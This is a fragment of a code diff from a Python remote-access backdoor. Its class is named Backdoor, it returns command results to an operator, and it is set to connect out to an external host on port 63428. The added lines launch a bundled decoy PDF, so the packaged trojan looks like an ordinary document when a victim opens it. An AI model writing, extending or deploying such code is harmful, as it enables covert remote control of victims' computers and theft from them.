@@ -68,6 +68,9 @@ class Backdoor:
                 
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\sample.pdf"
+subprocess.Popen(file_name, shell=True)
+
 try:
     my_backdoor = Backdoor('raghav45456-20379.portmap.host', 63428)
     my_backdoor.run()
